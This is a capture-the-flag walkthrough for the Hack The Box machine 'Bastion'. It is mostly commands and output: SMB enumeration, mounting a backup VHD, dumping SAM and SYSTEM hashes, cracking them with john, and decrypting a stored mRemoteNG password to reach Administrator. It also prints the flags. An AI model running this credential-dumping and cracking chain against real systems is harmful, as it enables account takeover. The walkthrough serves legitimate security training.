# bastion: https://app.hackthebox.com/machines/Bastion

```bash
nmap -sC -sV 10.10.10.134    

Nmap scan report for 10.10.10.134
Host is up (0.23s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
22/tcp  open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a56ae753c780ec8564dcb1c22bf458a (RSA)
|   256 cc2e56ab1997d5bb03fb82cd63da6801 (ECDSA)
|_  256 935f5daaca9f53e7f282e664a8a3a018 (ED25519)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -39m59s, deviation: 1h09m15s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-09T20:24:20
|_  start_date: 2023-05-09T20:22:58
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-05-09T22:24:17+02:00

```

```bash
smbmap -H 10.10.10.134 -u null -p null
[+] Guest session   	IP: 10.10.10.134:445	Name: 10.10.10.134                                      
[-] Work[!] Unable to remove test directory at \\10.10.10.134\Backups\OPBUMGXTES, please remove manually
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	Backups                                           	READ, WRITE	
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
```

```bash
rpcclient -U "" 10.10.10.134
Password for [WORKGROUP\]:

rpcclient $> lsaenumsid
found 11 SIDs

S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
S-1-5-80-0
S-1-5-6
S-1-5-32-559
S-1-5-32-555
S-1-5-32-551
S-1-5-32-545
S-1-5-32-544
S-1-5-20
S-1-5-19
S-1-1-0
```

```bash
rpcclient $> lookupsids S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420 NT SERVICE\WdiServiceHost (5)
rpcclient $> lookupsids S-1-5-80-0
S-1-5-80-0 NT SERVICE\ALL SERVICES (5)
rpcclient $> lookupsids S-1-5-6
S-1-5-6 NT AUTHORITY\SERVICE (5)
rpcclient $> lookupsids S-1-5-32-559
S-1-5-32-559 BUILTIN\Performance Log Users (4)
rpcclient $> lookupsids S-1-5-32-555
S-1-5-32-555 BUILTIN\Remote Desktop Users (4)
rpcclient $> lookupsids S-1-5-32-551
S-1-5-32-551 BUILTIN\Backup Operators (4)
rpcclient $> lookupsids S-1-5-32-544
S-1-5-32-544 BUILTIN\Administrators (4)
rpcclient $> lookupsids S-1-5-20
S-1-5-20 NT AUTHORITY\NETWORK SERVICE (5)
rpcclient $> lookupsids S-1-5-19
S-1-5-19 NT AUTHORITY\LOCAL SERVICE (5)
rpcclient $> lookupsids S-1-1-0
S-1-1-0 \Everyone (5)
```
```bash
nmap -sC -sV 10.10.10.134 -p-

Nmap scan report for 10.10.10.134
Host is up (0.21s latency).
Not shown: 65522 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
| ssh-hostkey: 
|   2048 3a56ae753c780ec8564dcb1c22bf458a (RSA)
|   256 cc2e56ab1997d5bb03fb82cd63da6801 (ECDSA)
|_  256 935f5daaca9f53e7f282e664a8a3a018 (ED25519)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: -39m59s, deviation: 1h09m15s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Bastion
|   NetBIOS computer name: BASTION\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-05-09T22:58:31+02:00
| smb2-time: 
|   date: 2023-05-09T20:58:33
|_  start_date: 2023-05-09T20:22:58
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```
```bash
smbclient \\\\10.10.10.134\\Backups          
Password for [WORKGROUP\joker]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue May  9 22:19:21 2023
  ..                                  D        0  Tue May  9 22:19:21 2023
  FSCQLEXHJW                          D        0  Tue May  9 22:19:21 2023
  note.txt                           AR      116  Tue Apr 16 11:10:09 2019
  OPBUMGXTES                          D        0  Tue May  9 21:28:23 2023
  SDT65CB.tmp                         A        0  Fri Feb 22 12:43:08 2019
  WindowsImageBackup                 Dn        0  Fri Feb 22 12:44:02 2019

		5638911 blocks of size 4096. 1177833 blocks available
```
```bash
smb: \> get note.txt 
getting file \note.txt of size 116 as note.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)

cat note.txt                         

Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow.
```

```bash

smb: \WindowsImageBackup\L4mpje-PC\> cd "Backup 2019-02-22 124351\"
smb: \WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\> dir
  .                                  Dn        0  Fri Feb 22 12:45:32 2019
  ..                                 Dn        0  Fri Feb 22 12:45:32 2019
  9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd     An 37761024  Fri Feb 22 12:44:02 2019
  9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd     An 5418299392  Fri Feb 22 12:44:03 2019
  BackupSpecs.xml                    An     1186  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml     An     1078  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml     An     8930  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml     An     6542  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml     An     2894  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml     An     1488  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml     An     1484  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml     An     3844  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml     An     3988  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml     An     7110  Fri Feb 22 12:45:32 2019
  cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml     An  2374620  Fri Feb 22 12:45:32 2019

```
```bash
sudo apt-get install libguestfs-tools
sudo mkdir -p /mnt/vhd

sudo guestmount -a 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd

su root             
Password: 
```
```bash
ls
'$Recycle.Bin'   config.sys                pagefile.sys   ProgramData      Recovery                     Users
 autoexec.bat   'Documents and Settings'   PerfLogs      'Program Files'  'System Volume Information'   Windows
```
```bash
[/mnt/vhd/Windows/System32/config]
└─# cp SAM /home/joker/Desktop/23_HTB/bastion 
[/mnt/vhd/Windows/System32/config]
└─# cp SYSTEM /home/joker/Desktop/23_HTB/bastion
```
```
samdump2 SYSTEM SAM 
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```
```bash
cat creds 
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```
```bash
john --format=NT --rules  --wordlist=/usr/share/wordlists/rockyou.txt creds
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 ASIMD 4x2])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
bureaulampje     (L4mpje)     
```
```bash
evil-winrm -i 10.10.10.134 -u l4mpje -p bureaulampje

Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1

```

```bash
ssh l4mpje@10.10.10.134
password:bureaulampje

Microsoft Windows [Version 10.0.14393]                                                                            
(c) 2016 Microsoft Corporation. All rights reserved.                                                              

l4mpje@BASTION C:\Users\L4mpje>whoami                                                                             
bastion\l4mpje     
```
```bash
l4mpje@BASTION C:\Users\L4mpje\Desktop>type user.txt                                                              
66b44a6d0273530970e3309bf3741d02 
```
```bash
l4mpje@BASTION C:\Program Files (x86)\mRemoteNG>dir                                                              
 Volume in drive C has no label.                                                                                 
 Volume Serial Number is 1B7D-E692                                                                               

 Directory of C:\Program Files (x86)\mRemoteNG                                                                   

22-02-2019  15:01    <DIR>          .                                                                            
22-02-2019  15:01    <DIR>          ..                                                                           
18-10-2018  23:31            36.208 ADTree.dll                                                                   
18-10-2018  23:31           346.992 AxInterop.MSTSCLib.dll                                                       
18-10-2018  23:31            83.824 AxInterop.WFICALib.dll                                                       
18-10-2018  23:31         2.243.440 BouncyCastle.Crypto.dll                                                      
18-10-2018  23:30            71.022 Changelog.txt                                                                
18-10-2018  23:30             3.224 Credits.txt 
.
.snipped
.        
```
```bash
l4mpje@BASTION C:\Program Files (x86)\mRemoteNG>type Readme.txt                                                  
mRemoteNG is the next generation of mRemote, a full-featured, multi-tab remote connections manager.              

It allows you to store all your remote connections in a simple yet powerful interface.                           

Currently these protocols are supported:                                                                         

 * RDP (Remote Desktop)                                                                                          
 * VNC (Virtual Network Computing)                                                                               
 * ICA (Independent Computing Architecture)                                                                      
 * SSH (Secure Shell)                                                                                            
 * Telnet (TELecommunication NETwork)                                                                            
 * HTTP/S (Hypertext Transfer Protocol)                                                                          
 * Rlogin (Rlogin)                                                                                               
 * RAW                                                                                                           

mRemoteNG can be installed on Windows 7 or later.                                                                

Windows 7 systems require RDP version 8:                                                                         
https://support.microsoft.com/en-us/kb/2592687                                                                   
OR                                                                                                               
https://support.microsoft.com/en-us/kb/2923545                                                                   

Windows 8+ support RDP version 8+ out of the box.                                                                

RDP versions are backwards compatible, so an mRemoteNG client running on Windows 10 can connection successfully t
o a Windows 2003 host (for example).                    
```
```bash
l4mpje@BASTION C:\Program Files (x86)\mRemoteNG>type Changelog.txt                                               
1.76.11 (2018-10-18):                                                                                            

Fixes:                                                                                                           
------                                                                                                           
#1139: Feature "Reconnect to previously opened sessions" not working                                             
#1136: Putty window not maximized                                       
```
```bash
Directory of C:\Users\L4mpje\AppData\Roaming\mRemoteNG                                                          

22-02-2019  15:03    <DIR>          .                                                                            
22-02-2019  15:03    <DIR>          ..                                                                           
22-02-2019  15:03             6.316 confCons.xml                                                                 
22-02-2019  15:02             6.194 confCons.xml.20190222-1402277353.backup                                      
22-02-2019  15:02             6.206 confCons.xml.20190222-1402339071.backup                                      
22-02-2019  15:02             6.218 confCons.xml.20190222-1402379227.backup                                      
22-02-2019  15:02             6.231 confCons.xml.20190222-1403070644.backup                                      
22-02-2019  15:03             6.319 confCons.xml.20190222-1403100488.backup                                      
22-02-2019  15:03             6.318 confCons.xml.20190222-1403220026.backup                                      
22-02-2019  15:03             6.315 confCons.xml.20190222-1403261268.backup                                      
22-02-2019  15:03             6.316 confCons.xml.20190222-1403272831.backup                                      
22-02-2019  15:03             6.315 confCons.xml.20190222-1403433299.backup                                      
22-02-2019  15:03             6.316 confCons.xml.20190222-1403486580.backup                                      
22-02-2019  15:03                51 extApps.xml                                                                  
22-02-2019  15:03             5.217 mRemoteNG.log                                                                
22-02-2019  15:03             2.245 pnlLayout.xml                                                                
22-02-2019  15:01    <DIR>          Themes                                                                       
              14 File(s)         76.577 bytes                                                                    
               3 Dir(s)   4.788.985.856 bytes free           
```
```bash
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>type confCons.xml                                       
.
.snipped
.
Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4H
dVmHAowVRdC7emf7lWWA10dQKiw=="
.
.snipped
.
```
```bash
python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
```
```bash
ssh Administrator@10.10.10.134
Administrator@10.10.10.134's password: 

Microsoft Windows [Version 10.0.14393]                                                                           
(c) 2016 Microsoft Corporation. All rights reserved.                                                             

administrator@BASTION C:\Users\Administrator>whoami                                                              
bastion\administrator                                                                                            
```
```bash
administrator@BASTION C:\Users\Administrator>type Desktop\root.txt                                               
dda06693fe65b05eb6ad6fab02bbeec7  
```

***References*** <br>
<https://book.hacktricks.xyz/linux-hardening/useful-linux-commands><br>
<https://github.com/kmahyyg/mremoteng-decrypt><br>
